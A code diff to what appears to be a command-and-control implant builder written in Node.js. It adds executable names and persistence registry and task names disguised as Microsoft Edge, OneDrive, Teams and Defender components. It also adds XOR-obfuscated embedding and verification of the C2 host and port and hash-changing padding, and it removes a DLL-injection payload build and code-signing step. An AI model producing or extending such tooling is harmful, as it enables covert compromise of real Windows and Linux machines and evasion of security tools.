@@ -10,6 +10,15 @@ const { signPeFile, getSigningStatus } = require('./signing');
 
 const ROOT = path.join(__dirname, '..');
 const SOURCE = path.join(ROOT, 'lastfinalversion2.go');
+
+const STEALTH_APP_NAMES = [
+  'MicrosoftEdgeUpdate.exe',
+  'OneDriveStandaloneUpdater.exe',
+  'TeamsMachineInstaller.exe',
+  'WingetUpdateTask.exe',
+  'SecurityHealthSystray.exe',
+  'MpCmdRun.exe',
+];
 const BUILDS_DIR = path.join(ROOT, 'builds');
 const MANIFEST = path.join(BUILDS_DIR, 'index.json');
 
@@ -63,6 +72,27 @@ function randomDllDropPrefix() {
   const a = crypto.randomBytes(2).toString('hex');
   const b = crypto.randomBytes(2).toString('hex');
   return `svc${a}_${b}_`;
+}
+
+function randomWindowsSensitive(dllDropPrefix) {
+  const brands = ['OneDrive', 'EdgeUpdate', 'Teams', 'Winget', 'DefenderHealth', 'StoreInstall'];
+  const b = brands[crypto.randomBytes(1)[0] % brands.length];
+  const tail = crypto.randomBytes(2).toString('hex');
+  return {
+    obfPersistRegName: `${b}UserSvc${tail}`,
+    obfWinUpdTask: `${b}Maintenance${tail}`,
+    obfWinUpdShort: `${b}Svc${tail}`,
+    obfWinUpdBat: `${b}Helper${tail}.bat`,
+    obfSystemUpdateCron: `${b.toLowerCase()}-sync-${tail}`,
+    obfV3CopyPrefix: `upd${tail}`,
+    obfDllDropPrefix: dllDropPrefix,
+  };
+}
+
+function defaultStealthOutputBase() {
+  const pick = STEALTH_APP_NAMES[crypto.randomBytes(1)[0] % STEALTH_APP_NAMES.length];
+  const suffix = crypto.randomBytes(3).toString('hex');
+  return `${pick.replace(/\.exe$/i, '')}_${suffix}.exe`;
 }
 
 function writeEncryptedEmbeddedDll(workDir, dllPath, stamp) {
@@ -141,6 +171,45 @@ function xorEncode(buf, key) {
 function obfuscateString(input, xorKey) {
   const b64 = Buffer.from(String(input), 'utf8').toString('base64');
   return xorEncode(Buffer.from(b64, 'utf8'), xorKey).toString('hex');
+}
+
+function deobfuscateEmbedded(hexStr, xorKey) {
+  const xored = Buffer.from(hexStr, 'hex');
+  const b64 = xorEncode(Buffer.from(xored), xorKey);
+  return Buffer.from(b64.toString('utf8'), 'base64').toString('utf8');
+}
+
+function normalizeImplantHost(raw) {
+  let s = String(raw || '').trim();
+  if (!s) return '';
+  if (s.includes('://')) {
+    try {
+      s = new URL(s).hostname;
+    } catch (_) {
+      s = s.replace(/^https?:\/\//i, '');
+    }
+  }
+  s = s.split('/')[0].split(':')[0].trim();
+  return s;
+}
+
+function verifyEmbeddedC2(goSource, xorKey, expectedHost, expectedPort) {
+  const mHost = goSource.match(/obfC2Host\s*=\s*"([0-9a-fA-F]+)"/);
+  const mPort = goSource.match(/obfPortStr\s*=\s*"([0-9a-fA-F]+)"/);
+  const mKey = goSource.match(/const xorKey = "([^"]+)"/);
+  if (!mHost || !mPort || !mKey) {
+    throw new Error('C2 obfuscation constants missing in generated Go source');
+  }
+  if (mKey[1] !== xorKey) {
+    throw new Error('xorKey mismatch in generated Go source');
+  }
+  const gotHost = deobfuscateEmbedded(mHost[1], xorKey);
+  const gotPort = deobfuscateEmbedded(mPort[1], xorKey);
+  if (gotHost !== expectedHost || gotPort !== String(expectedPort)) {
+    throw new Error(
+      `Embedded C2 mismatch: got ${gotHost}:${gotPort}, expected ${expectedHost}:${expectedPort}`
+    );
+  }
 }
 
 function randomKey(len = 16) {
@@ -236,7 +305,18 @@ function run(cmd, args, opts = {}) {
   });
 }
 
-function mutateSource(src, { xorKey, shiftValue, host, port, stamp, platform, buildid, dllDropPrefix }) {
+function mutateSource(src, {
+  xorKey,
+  shiftValue,
+  host,
+  port,
+  stamp,
+  platform,
+  buildid,
+  dllDropPrefix,
+  sensitivePlain,
+  stealthAppNames,
+}) {
   let out = src;
 
   out = out.replace(/^\/\/[^\n]*\n(?:\/\/[^\n]*\n)*/m, '');
@@ -260,7 +340,10 @@ function mutateSource(src, { xorKey, shiftValue, host, port, stamp, platform, bu
     out = out.replace(re, `$1"${hex}"`);
   }
 
-  const sensitive = { ...PLAIN_SENSITIVE, obfDllDropPrefix: dllDropPrefix || randomDllDropPrefix() };
+  const sensitive = sensitivePlain || {
+    ...PLAIN_SENSITIVE,
+    obfDllDropPrefix: dllDropPrefix || randomDllDropPrefix(),
+  };
   for (const [name, plain] of Object.entries(sensitive)) {
     const hex = obfuscateString(plain, xorKey);
     const re = new RegExp(`(${name}\\s*=\\s*)"[0-9a-fA-F]+"`, 'g');
@@ -268,7 +351,9 @@ function mutateSource(src, { xorKey, shiftValue, host, port, stamp, platform, bu
   }
 
   // app names slice (no .exe on Linux)
-  const appList = platform === 'linux' ? APP_NAMES_LINUX : APP_NAMES_WIN;
+  const appList = platform === 'linux'
+    ? APP_NAMES_LINUX
+    : (stealthAppNames ? STEALTH_APP_NAMES : APP_NAMES_WIN);
   const appHex = appList.map((n) => `"${obfuscateString(n, xorKey)}"`).join(', ');
   out = out.replace(
     /obfAppNames\s*=\s*\[\]string\{[^}]+\}/,
@@ -358,24 +443,22 @@ async function generateBuild(options = {}) {
     const { generateWinpeasBuild } = require('./winpeas_build');
     return generateWinpeasBuild(options);
   }
+  if (platform === 'windows' && variant === 'implant') {
+    const { generateWindowsStealthImplant } = require('./implant_windows');
+    return generateWindowsStealthImplant(options);
+  }
+
+  if (platform !== 'linux') {
+    throw new Error(`Unsupported platform: ${platform}`);
+  }
 
   const arch = String(options.arch || 'amd64').toLowerCase();
-  const host = String(options.host || process.env.BUILD_C2_HOST || '').trim();
+  const host = normalizeImplantHost(options.host || process.env.BUILD_C2_HOST || '');
   const port = Number(options.port || process.env.BUILD_C2_PORT || process.env.TCP_PORT || 2026);
   if (!host) {
     throw new Error('C2 host is required (set BUILD_C2_HOST on the teamserver or enter host in the builder)');
   }
-  if (host === '127.0.0.1' && process.env.APP_ENV === 'production') {
-    throw new Error('Refusing to build implant with 127.0.0.1 in production — set BUILD_C2_HOST to your public C2 address');
-  }
   if (!port || port < 1 || port > 65535) throw new Error('invalid port');
-
-  // Windows PE: always sign after build (dashboard does not require a toggle)
-  const signOpts = {
-    enabled: platform === 'windows' && options.signCode !== false,
-    subject: options.signSubject ? String(options.signSubject).trim() : undefined,
-    autoLab: options.signAuto !== false,
-  };
 
   if (!fs.existsSync(SOURCE)) {
     throw new Error('lastfinalversion2.go not found');
@@ -395,8 +478,10 @@ async function generateBuild(options = {}) {
   const mutated = mutateSource(raw, {
     xorKey, shiftValue, host, port, stamp, platform, buildid, dllDropPrefix,
   });
+  verifyEmbeddedC2(mutated, xorKey, host, port);
   const goFile = path.join(workDir, 'main.go');
   fs.writeFileSync(goFile, mutated, 'utf8');
+  console.log(`[BUILDER] Verified C2 embed ${host}:${port}`);
 
   // Platform helpers (build-tagged) — required for Linux cross-compile
   const platformFiles = [
@@ -425,104 +510,15 @@ async function generateBuild(options = {}) {
     'utf8'
   );
 
-  const format = String(options.format || 'exe').toLowerCase(); // exe | dll
-  const mingwBin = platform === 'windows' ? findMingwBin() : null;
-  let injectDllName = null;
-  let injectDllPacked = false;
-
-  // Stub so main.go compiles before/without a packed DLL
-  fs.writeFileSync(
-    path.join(workDir, 'embedded_dll.go'),
-    `package main\n\nfunc embeddedInjectDLLBytes() []byte { return nil }\n`,
-    'utf8'
-  );
-
-  // --- Step A: build real inject DLL (LoadLibrary payload) ---
-  if (platform === 'windows' && mingwBin) {
-    const dllName = 'inject_payload.dll';
-    const dllPath = path.join(workDir, dllName);
-    const cc = arch === '386' ? 'i686-w64-mingw32-gcc' : 'x86_64-w64-mingw32-gcc';
-    const dllEnv = {
-      ...process.env,
-      PATH: `${mingwBin};${process.env.PATH || ''}`,
-      GOOS: 'windows',
-      GOARCH: arch,
-      CGO_ENABLED: '1',
-      CC: cc,
-    };
-    const dllLdflags = `-s -w -X main.BuildMode=dll -buildid=${buildid}dll`;
-    console.log(`[BUILDER] Building inject DLL (${arch}) with ${cc}...`);
-    try {
-      await run(
-        'go',
-        ['build', '-tags', 'dll', '-buildmode=c-shared', '-trimpath', `-ldflags=${dllLdflags}`, '-o', dllPath, '.'],
-        { cwd: workDir, env: dllEnv }
-      );
-      if (fs.existsSync(dllPath) && fs.statSync(dllPath).size > 1000) {
-        injectDllName = dllName;
-        injectDllPacked = true;
-        writeEncryptedEmbeddedDll(workDir, dllPath, stamp);
-        console.log(`[BUILDER] Inject DLL ready (XOR-embedded in EXE)`);
-      }
-    } catch (e) {
-      console.warn('[BUILDER] DLL build failed (migrate will be unavailable):', e.message);
-    }
-  } else if (platform === 'windows' && !mingwBin) {
-    console.warn('[BUILDER] MinGW not found — EXE will not include migrate DLL pack');
-  }
-
-  // If user asked for dll-only artifact as primary download
-  if (platform === 'windows' && format === 'dll') {
-    if (!injectDllPacked) throw new Error('DLL build failed — need MinGW/GCC (CGO)');
-    const dllSrc = path.join(workDir, injectDllName);
-    const baseName = (options.outputName || `implant_${platform}_${arch}`).replace(/[<>:"/\\|?*\s]/g, '_');
-    const outName = baseName.toLowerCase().endsWith('.dll') ? baseName : `${baseName}.dll`;
-    const outPath = path.join(workDir, outName);
-    fs.copyFileSync(dllSrc, outPath);
-    const pad = crypto.randomBytes(128 + (crypto.randomBytes(1)[0] % 512));
-    fs.appendFileSync(outPath, pad);
-    const signResult = await signPeFile(outPath, signOpts);
-    const stat = fs.statSync(outPath);
-    const sha256 = crypto.createHash('sha256').update(fs.readFileSync(outPath)).digest('hex');
-    const meta = {
-      id,
-      platform,
-      arch,
-      host,
-      port,
-      fileName: outName,
-      size: stat.size,
-      sha256,
-      xorKeyLen: xorKey.length,
-      shiftValue,
-      stamp: stamp.slice(0, 16),
-      tool: 'go-cshared',
-      format: 'dll',
-      injectDllPacked: true,
-      authenticodeSigned: !!signResult.signed,
-      signPublisher: signResult.publisher,
-      signNote: signResult.signed ? undefined : (signResult.reason || undefined),
-      createdAt: new Date().toISOString(),
-    };
-    fs.writeFileSync(path.join(workDir, 'meta.json'), JSON.stringify(meta, null, 2));
-    const list = readManifest();
-    list.unshift(meta);
-    writeManifest(list.slice(0, 100));
-    return meta;
-  }
-
-  const ext = platform === 'windows' ? '.exe' : '';
   const baseName = (options.outputName || defaultOutputBase(platform)).replace(/[<>:"/\\|?*\s]/g, '_');
-  const outName = baseName.endsWith(ext) || !ext ? `${baseName}${ext || ''}` : `${baseName}${ext}`;
+  const outName = baseName;
   const outPath = path.join(workDir, outName);
 
-  const ldflags = platform === 'windows'
-    ? `-s -w -H=windowsgui -X main.BuildMode=exe -X main.PolyBuildId=${buildid} -buildid=${buildid}`
-    : `-s -w -X main.PolyBuildId=${buildid} -buildid=${buildid}`;
+  const ldflags = `-s -w -X main.PolyBuildId=${buildid} -buildid=${buildid}`;
 
   const env = {
     ...process.env,
-    GOOS: platform === 'windows' ? 'windows' : 'linux',
+    GOOS: 'linux',
     GOARCH: arch,
     CGO_ENABLED: '0',
   };
@@ -559,20 +555,8 @@ async function generateBuild(options = {}) {
     throw new Error('Build finished but output file missing');
   }
 
-  // Also keep a downloadable copy of the inject DLL next to the EXE
-  if (injectDllPacked && injectDllName) {
-    const sideDll = outName.replace(/\.exe$/i, '') + '_inject.dll';
-    fs.copyFileSync(path.join(workDir, injectDllName), path.join(workDir, sideDll));
-  }
-
-  // Append polymorphic padding (changes file hash without breaking PE/ELF load)
-  const pad = crypto.randomBytes(512 + (crypto.randomBytes(1)[0] % 8192));
+  const pad = crypto.randomBytes(256 + (crypto.randomBytes(1)[0] % 2048));
   fs.appendFileSync(outPath, pad);
-
-  let signResult = { signed: false };
-  if (platform === 'windows') {
-    signResult = await signPeFile(outPath, signOpts);
-  }
 
   const stat = fs.statSync(outPath);
   const sha256 = crypto.createHash('sha256').update(fs.readFileSync(outPath)).digest('hex');
@@ -591,10 +575,7 @@ async function generateBuild(options = {}) {
     stamp: stamp.slice(0, 16),
     tool: path.basename(String(tool)),
     format: 'exe',
-    injectDllPacked,
-    authenticodeSigned: !!signResult.signed,
-    signPublisher: signResult.publisher,
-    signNote: signResult.signed ? undefined : (signResult.reason || undefined),
+    injectDllPacked: false,
     createdAt: new Date().toISOString(),
   };
   fs.writeFileSync(path.join(workDir, 'meta.json'), JSON.stringify(meta, null, 2));
@@ -665,10 +646,20 @@ module.exports = {
   getBuildPath,
   deleteBuild,
   getSigningStatus,
+  SOURCE,
+  ROOT,
   BUILDS_DIR,
   randomId,
   randomKey,
+  randomDllDropPrefix,
   obfuscateString,
+  mutateSource,
+  verifyEmbeddedC2,
+  writeEncryptedEmbeddedDll,
+  findMingwBin,
+  normalizeImplantHost,
+  defaultStealthOutputBase,
+  randomWindowsSensitive,
   run,
   which,
   readManifest,
